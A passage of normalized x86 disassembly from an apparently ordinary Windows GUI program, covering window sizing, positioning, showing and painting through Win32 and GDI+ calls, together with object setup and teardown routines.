mov [ ecx + 0x8 ] edx
mov eax [ eax + 0x160 ]
pop edi
mov [ ecx + 0xc ] eax
pop esi
pop ebp
retn 0x4
sub_414520
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
push esi
push edi
mov esi edx
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
push 0x0
test esi esi
je r-xdata
push 0x2
push ecx
call [ MonitorFromWindow@IAT ]
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
lea ecx [ ebp - 0x3c ]
push ecx
push eax
mov [ ebp - 0x3c ] 0x28
call [ GetMonitorInfoW@IAT ]
test esi esi
je r-xdata
mov edi [ GetSystemMetrics@IAT ]
call edi
push 0x1
mov esi eax
call edi
xor ecx ecx
xor edx edx
lea edx [ ebp - 0x14 ]
push edx
push 0x0
push 0x30
call [ SystemParametersInfoW@IAT ]
mov eax [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov edx [ ebp - 0x38 ]
mov ecx [ ebp - 0x34 ]
mov esi [ ebp - 0x30 ]
mov eax [ ebp - 0x2c ]
jmp r-xdata
mov edx [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
mov esi [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn
mov [ ebx ] edx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] esi
mov [ ebx + 0xc ] eax
test ebx ebx
je r-xdata
sub_414600
push ebp
mov ebp esp
push 0xffffffff
push sub_4493aa
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_418ad0
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x248 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov eax 0x2
mov [ ebp - 0x4 ] al
mov [ esi + 0x250 ] r--data
mov [ esi + 0x254 ] ebx
mov [ esi + 0x258 ] bl
mov [ ebp - 0x4 ] 0x3
mov [ esi + 0x260 ] ebx
mov [ esi + 0x264 ] ebx
mov [ esi + 0x268 ] ebx
mov [ esi + 0x26c ] ebx
mov [ esi + 0x270 ] ebx
mov [ esi + 0x274 ] ebx
mov [ esi + 0x278 ] ebx
mov [ esi + 0x27c ] ebx
mov [ esi + 0x290 ] ebx
mov [ esi + 0x294 ] ebx
mov [ esi + 0x29c ] ebx
mov [ esi + 0x2a0 ] ebx
mov [ esi + 0x2a4 ] ebx
mov ecx 0x4
mov [ ebp - 0x4 ] cl
or [ esi + 0x22c ] ecx
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov eax 0x1
mov [ esi + 0x220 ] r--data
mov [ esi + 0x228 ] 0x820b0000
mov [ esi + 0x244 ] ebx
mov [ esi + 0x24c ] ax
mov [ esi + 0x24e ] al
mov [ esi + 0x280 ] eax
mov [ esi + 0x25c ] ebx
mov [ esi + 0x235 ] bl
mov [ esi + 0x284 ] 0x100
mov [ esi + 0x288 ] ebx
mov [ esi + 0x28c ] bx
mov [ esi + 0x298 ] eax
mov [ esi + 0x2ac ] eax
mov [ esi + 0x2b0 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_414790
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4147c0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4147c0
push ebp
mov ebp esp
push 0xffffffff
push sub_44934a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x29c ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ esi + 0x29c ] ebx
mov [ esi + 0x2a0 ] ebx
mov [ esi + 0x2a4 ] ebx
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x250 ] r--data
mov [ ebp - 0x4 ] bl
lea eax [ esi + 0x248 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] bl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push eax
call [ operator delete@IAT ]
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_418cc0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_4148b0
push esi
push edi
mov edi ecx
lea esi [ edi - 0x1ac ]
lea eax [ esi + 0x70 ]
push eax
call sub_412c20
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
cmp [ edi + 0xec ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ esi + 0x4 ] 0x0
pop edi
pop esi
retn 0x4
test esi esi
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
sub_414900
mov eax ecx
cmp [ eax + 0x24e ] 0x0
je r-xdata
retn
cmp [ eax + 0x158 ] 0x0
jne r-xdata
mov ecx [ eax + 0x170 ]
mov ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x1b0 ]
push ebx
push edx
lea ebx [ eax + 0x250 ]
call sub_426fd0
pop ebx
sub_414940
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
push eax
push edi
mov esi ecx
call sub_40e4c0
cmp [ esi + 0x25 ] 0x0
mov eax [ esi + 0x4 ]
mov [ esi + 0x25c ] edi
mov ecx [ eax + 0x70 ]
mov [ esi + 0x194 ] ecx
mov edx [ eax + 0x80 ]
mov [ esi + 0x198 ] edx
jne r-xdata
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x69 ] 0x0
je r-xdata
mov [ esi + 0x26 ] 0x0
mov [ edi + 0x40 ] 0x1
sub_414990
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
test edx edx
je r-xdata
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0x18 ]
push ecx
mov ecx esi
call edx
mov eax [ rw-data ]
mov ecx [ eax + 0x44 ]
mov eax [ esi + 0x18 ]
mov edx [ ecx ]
mov edx [ edx + 0xc ]
push eax
push esi
call edx
pop esi
pop ebp
retn 0x4
mov eax [ esi + 0x48 ]
sub eax [ esi + 0x40 ]
mov ecx [ esi + 0x4c ]
sub ecx [ esi + 0x44 ]
push edi
mov edi [ edx ]
mov [ esi + 0x40 ] edi
mov edx [ edx + 0x4 ]
add edi eax
lea eax [ ecx + edx ]
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] eax
mov [ esi + 0x44 ] edx
mov ecx [ esi + 0x40 ]
mov [ esi + 0x50 ] ecx
mov ecx [ esi + 0x4c ]
mov [ esi + 0x54 ] edx
mov edx [ esi + 0x40 ]
mov eax edi
mov [ esi + 0x58 ] eax
mov eax [ esi + 0x44 ]
mov [ esi + 0x30 ] edx
mov edx [ esi + 0x4c ]
mov [ esi + 0x5c ] ecx
mov ecx edi
mov [ esi + 0x34 ] eax
mov [ esi + 0x38 ] ecx
mov [ esi + 0x3c ] edx
pop edi
sub_414a40
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x18 ] eax
push ebx
push esi
mov esi ecx
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
push ecx
mov ecx esi
call edx
test al al
jne r-xdata
mov edx [ esi + 0x25c ]
movzx eax [ edx + 0x186 ]
mov [ esi + 0x24c ] al
mov al [ edx + 0x184 ]
mov [ esi + 0x24d ] al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x18 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0x24e ] 0x0
mov cl [ edx + 0x194 ]
mov [ esi + 0x24e ] cl
jmp r-xdata
cmp [ esi + 0x69 ] bl
jne r-xdata
cmp [ esi + 0x2b0 ] ebx
jne r-xdata
xor ebx ebx
mov [ esp + 0x10 ] ebx
cmp edi ebx
je r-xdata
mov ecx 0xc00000
cmp [ esi + 0x24c ] bl
je r-xdata
cmp [ esi + 0x26 ] bl
je r-xdata
mov eax edi
lea ecx [ ecx ]
mov al [ edx + 0x184 ]
mov [ esi + 0x24d ] al
test al al
je r-xdata
mov ecx 0xc40000
or [ esi + 0x228 ] 0x10000000
mov [ esp + 0x10 ] ecx
jmp r-xdata
mov eax [ eax + 0x18 ]
cmp eax ebx
jne r-xdata
not ecx
and [ esi + 0x228 ] ecx
or [ esi + 0x228 ] ecx
jmp r-xdata
mov ecx [ eax + 0x60 ]
cmp ecx ebx
jne r-xdata
mov [ esp + 0x10 ] ebx
mov eax [ esi + 0x248 ]
lea edi [ esi + 0x248 ]
cmp [ eax - 0xc ] ebx
jne r-xdata
mov eax [ esi + 0x44 ]
mov edx [ esi + 0x40 ]
mov [ esp + 0x18 ] eax
mov eax [ esi + 0x4c ]
mov [ esp + 0x14 ] edx
mov edx [ esi + 0x48 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x1c ] edx
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
lea eax [ esp + 0x14 ]
push eax
push esi
call edx
cmp eax 0x80004001
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8c ]
mov ecx esi
call eax
mov ecx [ esi + 0x20 ]
cmp ecx ebx
je r-xdata
mov edx [ esi + 0x224 ]
mov ecx [ esi + 0x220 ]
push edx
push ecx
mov eax esp
mov [ eax ] 0x0
mov eax [ esi + 0x22c ]
mov edx [ edi ]
push eax
mov eax [ esi + 0x228 ]
push edx
push ecx
mov edx esp
lea edi [ esi + 0x40 ]
mov [ edx ] edi
mov edx [ esp + 0x24 ]
push edx
add esi 0x1ac
call sub_417470
xor ecx ecx
pop edi
test eax eax
setne al
mov ecx [ esp + 0x20 ]
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x98 ]
cmp edx ebx
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
mov edi [ esp + 0x20 ]
mov [ esi + 0x40 ] eax
mov [ esi + 0x50 ] eax
mov [ esi + 0x44 ] ecx
mov [ esi + 0x54 ] ecx
mov [ esi + 0x48 ] edx
mov [ esi + 0x58 ] edx
mov [ esi + 0x4c ] edi
mov [ esi + 0x5c ] edi
mov eax edx
lea ebx [ eax + 0x2 ]
xor eax eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
push edx
push edi
mov ebx eax
call sub_402910
sub_414c40
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push ebx
push esi
mov esi ecx
cmp [ esi + 0x24c ] 0x0
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x44 ]
mov edx [ esi + 0x48 ]
mov [ esp + 0x18 ] eax
mov eax [ esi + 0x4c ]
push edi
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] edx
mov [ esp + 0x28 ] eax
mov edi 0xc00000
je r-xdata
mov ecx [ esi + 0x25c ]
mov al [ ecx + 0x184 ]
xor ebx ebx
cmp [ esi + 0x24d ] al
mov [ esi + 0x24d ] al
setne bl
test al al
jne r-xdata
mov edi 0xc40000
mov [ esi + 0x24e ] 0x0
mov cl [ ecx + 0x194 ]
mov [ esi + 0x24e ] cl
jmp r-xdata
not edi
and [ esi + 0x228 ] edi
or [ esi + 0x228 ] edi
jmp r-xdata
test al al
je r-xdata
mov eax [ esi + 0x4 ]
mov edi [ eax + 0x1c ]
mov ebx [ eax + 0x20 ]
cmp [ esi + 0x2ac ] ecx
je r-xdata
cmp [ esi + 0x258 ] cl
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8c ]
mov ecx esi
call eax
xor ecx ecx
cmp ebx ecx
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0xa4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x64 ]
mov ecx esi
call eax
lea eax [ esi + 0x40 ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
call [ EqualRect@IAT ]
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
cmp edi ecx
je r-xdata
mov edx [ esi + 0x228 ]
mov eax [ esi + 0x1b0 ]
push edx
push 0xfffffff0
push eax
call [ SetWindowLongW@IAT ]
mov ecx [ esi + 0x1b0 ]
push 0x237
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call [ SetWindowPos@IAT ]
xor ecx ecx
push 0x1
push ecx
mov ecx [ esi + 0x254 ]
push ecx
call [ SetWindowRgn@IAT ]
mov [ esi + 0x258 ] 0x0
cmp [ esi + 0x1a0 ] 0x0
lea edx [ esi + 0x154 ]
je r-xdata
mov edx [ esi + 0x74 ]
mov ecx [ edx + ebx * 4 ]
test ecx ecx
je r-xdata
cmp ebx ecx
je r-xdata
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
mov ecx 0x1
call sub_41ae80
inc ebx
cmp ebx edi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov eax [ esi + 0x1b0 ]
lea edx [ esp + 0xc ]
push edx
push eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] ecx
call [ GetClientRect@IAT ]
mov ecx [ esp + 0x14 ]
sub ecx [ esp + 0xc ]
cmp ecx edi
jne r-xdata
cmp [ esi + 0x1a0 ] 0x0
lea edx [ esi + 0x154 ]
je r-xdata
mov eax [ esi + 0x74 ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0xc ] 0x10
jne r-xdata
mov eax [ esi + 0x1b0 ]
push 0x214
push ebx
push edi
push 0x0
push 0x0
push 0x0
push eax
call [ SetWindowPos@IAT ]
mov edx [ esp + 0x18 ]
sub edx [ esp + 0x10 ]
cmp edx ebx
je r-xdata
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
mov ecx 0x6
call sub_41ae80
inc ebx
cmp ebx edi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push 0x0
call edx
cmp [ esi + 0x24e ] 0x0
je r-xdata
mov ecx [ esi + 0x74 ]
mov ecx [ ecx + ebx * 4 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0xc ] 0x10
je r-xdata
cmp [ esi + 0x258 ] 0x0
je r-xdata
mov ecx [ esi + 0x1b0 ]
push ecx
call [ IsZoomed@IAT ]
test eax eax
jne r-xdata
inc ebx
cmp ebx edi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x0
call eax
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebx
xor ecx esp
mov al 0x1
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x254 ]
push 0x1
push 0x0
push ecx
call [ SetWindowRgn@IAT ]
mov [ esi + 0x258 ] 0x0
cmp [ esi + 0x158 ] eax
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x68 ]
call eax
mov edx [ esi + 0x170 ]
mov ecx [ edx ]
xor ecx ecx
jmp r-xdata
mov eax [ esi + 0x1b0 ]
lea ebx [ esi + 0x250 ]
push eax
call sub_426fd0
jmp r-xdata
sub_414f10
push esi
mov esi ecx
mov eax [ esi + 0x1b0 ]
push eax
mov [ esi + 0x298 ] 0x0
call [ IsWindow@IAT ]
test eax eax
je r-xdata
pop esi
retn
mov ecx [ esi + 0x1b0 ]
push 0x0
push 0xf060
push 0x112
push ecx
call [ SendMessageW@IAT ]
sub_414f50
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi ]
mov edx [ eax + 0x1c ]
call edx
mov esi [ edi + 0x78 ]
sub esi [ edi + 0x74 ]
xor ebx ebx
sar esi 0x2
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov eax [ edi + 0x74 ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
inc ebx
cmp ebx esi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
call eax
sub_414f90
push ebp
mov ebp esp
push ebx
mov bl [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ esi + 0x1b0 ]
movzx ecx bl
neg ecx
sbb ecx ecx
and ecx 0x5
push ecx
push edx
mov [ esi + 0x26 ] bl
call [ ShowWindow@IAT ]
test bl bl
jne r-xdata
cmp [ esi + 0x1a0 ] 0x0
lea edx [ esi + 0x154 ]
je r-xdata
lea edx [ ebp + 0xb ]
mov [ ebp + 0xb ] bl
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
push edx
push esi
call eax
cmp eax 0x80004001
je r-xdata
pop esi
mov al 0x1
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x1b0 ]
push edi
push 0x0
push 0x0
push 0x2a3
lea edi [ esi + 0x70 ]
push eax
lea esi [ ebp + 0xb ]
mov [ ebp + 0xb ] bl
call sub_4130a0
pop edi
mov ecx 0x7
call sub_41ae80
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov al [ esi + 0x26 ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_415040
push ebx
push esi
push edi
mov edi ecx
mov [ edi + 0x29 ] 0x1
mov esi [ edi + 0x78 ]
sub esi [ edi + 0x74 ]
xor ebx ebx
sar esi 0x2
test esi esi
jle r-xdata
mov edx [ edi ]
mov eax [ edx + 0x74 ]
mov ecx edi
call eax
test al al
je r-xdata
mov eax [ edi + 0x74 ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
xor ebx ebx
test esi esi
jle r-xdata
mov ecx [ edi + 0x1b0 ]
push 0x5
push ecx
call [ ShowWindow@IAT ]
mov edx [ edi + 0x1b0 ]
push 0x257
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edx
call [ SetWindowPos@IAT ]
mov eax [ edi + 0x1b0 ]
push eax
call [ UpdateWindow@IAT ]
inc ebx
cmp ebx esi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
cmp [ ecx + 0x68 ] 0x0
jne r-xdata
mov ecx [ edi + 0x74 ]
mov ecx [ ecx + ebx * 4 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x34 ]
call eax
cmp [ ecx + 0x10 ] 0x2
je r-xdata
inc ebx
cmp ebx esi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
cmp [ ecx + 0x64 ] 0x0
je r-xdata
cmp [ ecx + 0x10 ] 0x2
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x34 ]
call eax
sub_415100
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi ecx
xor ecx ecx
cmp [ ebp + 0xc ] 0x111
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ esi ]
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx [ ebp + 0xc ]
push ebx
push edx
mov edx [ eax + 0x18 ]
push ecx
push edi
mov ecx esi
call edx
mov eax [ edi + 0x4 ]
cmp eax ecx
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0x14 ] ecx
je r-xdata
xor eax eax
mov eax [ eax + 0x14 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ eax + 0x14 ]
cmp eax 0x77ddf67
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ esi ]
mov edx [ edx + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push ebx
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
mov ecx esi
call edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ esi - 0x70 ]
mov edx [ eax + 0xdc ]
lea ecx [ esi - 0x70 ]
cmp eax 0x9567957
je r-xdata
mov eax [ esi - 0x70 ]
mov edx [ eax + 0xe4 ]
lea ecx [ esi - 0x70 ]
jmp r-xdata
cmp eax 0x97ddae7
je r-xdata
call edx
mov eax [ esi - 0x70 ]
mov edx [ eax + 0xe0 ]
lea ecx [ esi - 0x70 ]
push edi
call edx
jmp r-xdata
mov [ ebp - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4151e0
push ebp
mov ebp esp
push ebx
push esi
mov ebx ecx
mov esi [ ebx + 0x78 ]
sub esi [ ebx + 0x74 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebx + 0x74 ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
inc edi
cmp edi esi
jl r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x3c ]
push eax
call edx
sub_415220
push ebp
mov ebp esp
push ecx
mov al [ ebp + 0x8 ]
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x1
mov [ esi + 0x28 ] al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
push ebx
push edi
test al al
je r-xdata
mov ebx [ esi + 0x78 ]
sub ebx [ esi + 0x74 ]
xor eax eax
sar ebx 0x2
mov [ ebp - 0x4 ] eax
test ebx ebx
jle r-xdata
mov edi [ esi + 0x25c ]
mov [ esi + 0x24 ] 0x0
mov [ esi + 0x29 ] 0x0
mov ecx [ edi + 0x1a0 ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0x70 ]
call sub_413180
cmp [ ebp + 0x8 ] 0x0
pop edi
pop ebx
jne r-xdata
mov ecx [ esi + 0x74 ]
mov edi [ ecx + eax * 4 ]
test edi edi
je r-xdata
mov eax [ esi + 0x4 ]
call sub_4142d0
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov [ edi + 0x1a0 ] 0x0
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax ebx
jl r-xdata
cmp [ edi + 0x14 ] 0x1
je r-xdata
mov edx [ esi + 0x1b0 ]
push 0x0
push edx
call [ ShowWindow@IAT ]
mov edx [ edi ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
push eax
mov ecx edi
call edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x1b0 ]
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4c ]
push 0x0
mov ecx edi
call eax
push eax
lea eax [ esi + 0x1a4 ]
push eax
mov eax edi
call sub_419e00
sub_415330
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x1b0 ]
push eax
call [ IsZoomed@IAT ]
test eax eax
setne bl
push 0x0
test bl bl
je r-xdata
mov edx [ esi + 0x1b0 ]
push 0xf030
push 0x112
push edx
mov ecx [ esi + 0x1b0 ]
push 0xf120
push 0x112
push ecx
jmp r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ eax + 0x25 ] 0x0
je r-xdata
call [ SendMessageW@IAT ]
mov eax [ ebp + 0x8 ]
test bl bl
sete cl
cmp [ eax + 0x24 ] 0x0
mov [ eax + 0x74 ] cl
je r-xdata
cmp [ eax + 0x26 ] 0x0
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
cmp [ edx + 0xab ] 0x0
mov esi [ ecx ]
sete dl
movzx edx dl
push 0x0
push edx
push eax
mov eax [ esi + 0x20 ]
call eax
sub_415410
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x2c ]
call edx
test al al
je r-xdata
pop esi
pop ebp
retn 0x14
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0xf4 ]
push 0xcc0020
push eax
push ecx
push edx
mov edx [ ebp + 0x14 ]
sub edx eax
mov eax [ ebp + 0x10 ]
push edx
sub eax ecx
mov ecx [ ebp + 0x18 ]
mov edx [ ecx + 0x8 ]
push eax
mov eax [ edx ]
push 0x0
push 0x0
push eax
call [ BitBlt@IAT ]
sub_415470
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi ecx
cmp [ edi + 0xf9 ] 0x0
jne r-xdata
push ebx
lea ebx [ edi - 0x154 ]
call sub_419380
pop edi
pop ebx
pop ebp
retn 0x4
push esi
push ebx
lea ecx [ edi - 0x154 ]
call sub_4154c0
mov eax [ edi - 0x154 ]
mov edx [ eax + 0x104 ]
push ebx
lea ecx [ edi - 0x154 ]
call edx
pop esi
sub_4154c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x30 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ edi + 0x25c ]
mov esi [ ecx + 0x1a0 ]
xor ebx ebx
mov [ esp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov ecx [ esp + 0x3c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi ]
mov eax [ esi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx esi
call edx
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x38 ] eax
mov eax [ edi + 0x174 ]
mov [ esp + 0x1c ] eax
mov eax [ edi + 0x178 ]
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov ebx [ edi + 0x17c ]
mov edi [ edi + 0x180 ]
mov [ esp + 0x28 ] edi
sub edi eax
mov [ esp + 0x18 ] edi
fild [ esp + 0x18 ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x34 ] ecx
mov [ esp + 0x20 ] eax
fidiv [ esp + 0x10 ]
mov [ esp + 0x24 ] ebx
fstp [ esp + 0x10 ]
fld [ esp + 0x10 ]
fimul [ esp + 0xc ]
fstp [ esp + 0xc ]
fld [ esp + 0xc ]
call sub_4449b0
mov ecx [ esp + 0x1c ]
sub ebx ecx
cmp eax ebx
jge r-xdata
mov edi [ esp + 0x14 ]
mov ebx [ edi + 0xc ]
mov ecx [ ebx ]
push 0x2
push ecx
call [ GdipSetInterpolationMode@IAT ]
test eax eax
je r-xdata
add eax ecx
mov [ esp + 0x24 ] eax
mov ebx [ edi + 0xc ]
mov edx [ ebx ]
push 0x1
push edx
call [ GdipSetPixelOffsetMode@IAT ]
test eax eax
je r-xdata
mov [ ebx + 0x4 ] eax
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push 0x1
lea ecx [ esp + 0x30 ]
push ecx
lea edx [ esp + 0x24 ]
push edx
push edi
mov ecx esi
call eax
mov esi [ edi + 0xc ]
mov ecx [ esi ]
push 0x4
push ecx
